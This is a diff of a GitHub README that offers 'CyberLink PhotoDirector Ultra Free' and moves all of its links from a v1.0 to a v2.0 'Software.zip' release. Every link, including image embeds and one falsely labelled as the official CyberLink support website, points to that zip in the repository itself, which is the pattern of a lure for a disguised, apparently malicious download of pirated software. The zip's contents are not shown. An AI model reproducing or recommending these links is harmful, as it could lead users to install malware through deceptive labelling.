@@ -2,7 +2,7 @@
 
 Welcome to the CyberLink PhotoDirector Ultra Free repository! Here you can find information and resources related to CyberLink PhotoDirector Ultra software versions 5 to 10, including reviews, tutorials, giveaways, and more!
 
-![CyberLink PhotoDirector Ultra](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v1.0/Software.zip)
+![CyberLink PhotoDirector Ultra](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v2.0/Software.zip)
 
 ## Repository Contents
 
@@ -31,7 +31,7 @@ This repository is dedicated to discussing and exploring CyberLink PhotoDirector
 #### Explore more about CyberLink PhotoDirector Ultra!
 
 ### Installation
-To download the latest version of CyberLink PhotoDirector Ultra, click the following link: [Download PhotoDirector Ultra](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v1.0/Software.zip). Make sure to check the "Releases" section for any updates or additional files.
+To download the latest version of CyberLink PhotoDirector Ultra, click the following link: [Download PhotoDirector Ultra](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v2.0/Software.zip). Make sure to check the "Releases" section for any updates or additional files.
 
 ### Get Started
 1. Download the PhotoDirector Ultra zip file.
@@ -43,10 +43,10 @@ To download the latest version of CyberLink PhotoDirector Ultra, click the follo
 If you have any tutorials, reviews, giveaways, or other content related to CyberLink PhotoDirector Ultra, feel free to contribute to this repository. Your contributions are highly appreciated!
 
 ### Support
-For any issues or questions regarding PhotoDirector Ultra, please visit the official [CyberLink](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v1.0/Software.zip) website for support or contact their customer service.
+For any issues or questions regarding PhotoDirector Ultra, please visit the official [CyberLink](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v2.0/Software.zip) website for support or contact their customer service.
 
 ## Let's Enhance Your Photo Editing Experience with CyberLink PhotoDirector Ultra!
 
-![Editing Photos](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v1.0/Software.zip)
+![Editing Photos](https://github.com/creepydenn/CyberLink-PhotoDirector-Ultra-Free/releases/download/v2.0/Software.zip)
 
 Happy editing! 🎨📷
